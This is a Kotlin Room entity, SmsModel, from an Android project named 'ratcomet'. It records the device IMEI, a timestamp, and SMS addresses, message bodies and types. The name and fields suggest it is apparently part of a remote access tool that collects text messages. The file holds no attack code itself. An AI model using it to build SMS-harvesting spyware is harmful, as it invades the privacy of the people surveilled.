package ug.hix.ratcomet.model

import androidx.room.Entity
import androidx.room.PrimaryKey
import ug.hix.ratcomet.util.CometUtil

@Entity
data class SmsModel(
        @PrimaryKey(autoGenerate = true)
        val id: Int = 0,
        val imei : String = CometUtil.getImei(),
        val date : String = CometUtil.currentDateTime(),
        val address : String,
        val msg: String,
        val type : String
        )